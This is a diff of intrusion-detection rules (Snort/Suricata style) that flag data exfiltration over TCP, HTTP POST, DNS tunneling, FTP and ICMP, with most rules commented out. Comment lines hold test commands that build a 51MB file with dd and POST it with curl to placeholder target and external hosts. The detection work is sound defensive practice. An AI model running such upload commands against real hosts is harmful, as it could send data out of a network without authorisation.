@@ -1,9 +1,70 @@
-alert tcp $EXTERNAL_NET any -> $HOME_NET any (
-    msg:"Data Exfiltration via TCP";
-    flow:established;
-    stream_size:>50000000, to_server;
-    detection_filter: track by_dst, count 1, seconds 30;
-    metadata: attack_category data_exfiltration;
-    priority:1;
-    sid:41008; rev:1;
+# Data Exfiltration via HTTP POST
+#alert tcp $EXTERNAL_NET any -> $HOME_NET any (
+#    msg:"Data Exfiltration via TCP";
+#    flow:established;
+#    stream_size:>50000000, to_server;
+#    detection_filter: track by_dst, count 1, seconds 30;
+#    metadata: attack_category data_exfiltration;
+#    priority:1;
+#    sid:41008; rev:1;
+#)
+
+# Data Exfiltration via HTTP POST
+# TEST: dd if=/dev/zero of=largefile.bin bs=1M count=51
+# curl -X POST -H "Content-Type: application/octet-stream" --data-binary @largefile.bin http://<TARGET_IP>/upload
+# curl -i -X POST -H "Content-Type: multipart/form-data" -F "data=@largefile.bin" http://<EXTRNAL_IP>
+#alert http any any -> any any (
+#  msg:"Data Exfiltration via Large HTTP POST";
+#  flow:established,to_server;
+#  service: http;
+#  content:"POST";
+#  stream_size: >52428800;  # >50MB payload
+#  classtype:data-theft;
+#  priority:1;
+#  sid:41008; rev:1;
+#)
+
+alert tcp $HOME_NET any -> $EXTERNAL_NET any (
+  msg:"Data Exfiltration via HTTP POST";
+  #flow:to_server, established;
+  service: http;
+  content:"POST";
+  classtype: data-theft;
+  priority: 1;
+  sid: 41008; rev:1;
 )
+
+
+## Data Exfiltration via DNS Tunneling
+#alert udp $HOME_NET any -> $EXTERNAL_NET 53 (
+#    msg:"Potential DNS Tunneling Detected";
+#    flow:to_server;
+#    service:dns;
+#    dns_query;
+#    pkt_data; content:".";  # placeholder to trigger inspection
+#    pkt_len: >150;
+#    threshold:type both, track by_src, seconds 60, count 50;
+#    classtype:data-theft;
+#    sid:1000002; rev:2; priority:1;
+#)
+#
+## Data Exfiltration via FTP
+#alert ftp $HOME_NET any -> $EXTERNAL_NET 21 (
+#    msg:"Large FTP Transfer Detected";
+#    flow:established,to_server;
+#    service:ftp;
+#    stream_size:client,>,524288000;  # >500MB
+#    threshold:type limit, track by_src, seconds 60, count 1;
+#    classtype:data-theft;
+#    sid:1000003; rev:2; priority:1;
+#)
+#
+## Data Exfiltration via ICMP Covert Channel
+#alert icmp $HOME_NET any -> $EXTERNAL_NET any (
+#    msg:"Possible ICMP-based Data Exfiltration";
+#    icmp_type:8;  # Echo Request
+#    pkt_len:>1000;
+#    threshold:type both, track by_src, seconds 1, count 5;
+#    classtype:data-theft;
+#    sid:1000004; rev:2; priority:1;
+#)
